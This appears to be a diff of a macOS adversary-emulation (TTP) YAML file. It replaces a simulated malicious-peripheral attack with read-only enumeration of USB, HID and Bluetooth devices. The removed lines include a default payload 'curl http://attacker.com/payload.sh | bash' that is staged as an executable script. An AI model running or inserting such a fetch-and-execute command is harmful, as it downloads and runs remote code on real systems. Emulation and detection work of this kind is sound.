@@ -5,7 +5,9 @@ name: Malicious Peripheral Connection
 authors:
 - TTPs Generator
 description: |
-  Simulate connection of malicious peripheral device (keyboard, mouse, etc.) to establish initial access
+  Enumerate connected peripheral and HID devices on macOS to discover hardware additions.
+  This TTP inspects USB device trees, HID devices, input devices, and Bluetooth peripherals
+  to identify potentially malicious hardware additions such as rogue keyboards or network adapters.
 mitre:
   tactics:
   - TA0001 Initial Access
@@ -14,44 +16,32 @@ mitre:
 requirements:
   platforms:
   - os: darwin
-args:
-- name: target_device
-  description: Target macOS device to compromise
-  type: string
-  default: localhost
-- name: peripheral_type
-  description: Type of malicious peripheral (keyboard, mouse, network_adapter)
-  type: string
-  default: keyboard
-- name: peripheral_id
-  description: Device identifier for malicious peripheral
-  type: string
-  default: 0x1234:0x5678
-- name: command_payload
-  description: Command to execute via malicious peripheral
-  type: string
-  default: curl http://attacker.com/payload.sh | bash
 steps:
-- name: Detect peripheral devices
-  description: Enumerate connected peripheral devices
-  inline: system_profiler SPUSBDataType SPBluetoothDataType 2>/dev/null | grep -i "device\|peripheral" | head -10 || echo
-    "Peripheral enumeration completed"
-- name: Emulate peripheral connection
-  description: Simulate malicious peripheral connecting
-  inline: 'echo "Peripheral Connected: ${peripheral_type} (${peripheral_id}) at $(date)" >> /tmp/peripheral_connection.log'
-- name: Stage malicious payload
-  description: Stage payload for peripheral to inject
-  inline: echo "${command_payload}" > /tmp/peripheral_payload.sh && chmod +x /tmp/peripheral_payload.sh
-- name: Simulate keystroke injection
-  description: Simulate keystroke injection attack
-  inline: echo "Injecting keystrokes from peripheral ${peripheral_type}" >> /tmp/peripheral_connection.log
-- name: Monitor device activity
-  description: Check for malicious peripheral activity
-  inline: ls -la /tmp/peripheral* 2>/dev/null | wc -l
-  cleanup:
-    inline: |-
-      rm -f /tmp/peripheral_connection.log
-      rm -f /tmp/peripheral_payload.sh
+- name: Enumerate USB device tree
+  description: Query IOKit USB plane for connected devices with class, product, and vendor info
+  inline: |
+    echo "=== USB Device Tree ==="
+    ioreg -p IOUSB -l | grep -i "class\|product\|vendor" | head -40
+- name: Enumerate input devices
+  description: List HID system input devices from the IOKit registry
+  inline: |
+    echo "=== Input Devices (IOHIDSystem) ==="
+    ioreg -n IOHIDSystem | grep -i "device" | head -20
+- name: List USB devices via system_profiler
+  description: Enumerate USB devices with detailed hardware information
+  inline: |
+    echo "=== USB Devices (system_profiler) ==="
+    system_profiler SPUSBDataType 2>/dev/null
+- name: Enumerate Bluetooth devices
+  description: List all Bluetooth devices and connections
+  inline: |
+    echo "=== Bluetooth Devices ==="
+    system_profiler SPBluetoothDataType 2>/dev/null
+- name: Enumerate HID devices from IOKit
+  description: Query IOKit for HID devices showing product, manufacturer, and transport details
+  inline: |
+    echo "=== HID Device Details ==="
+    ioreg -r -c IOHIDDevice -l | grep "Product\|Manufacturer\|Transport" | head -40
 tests:
 - name: dry_run_test
   dry_run: true
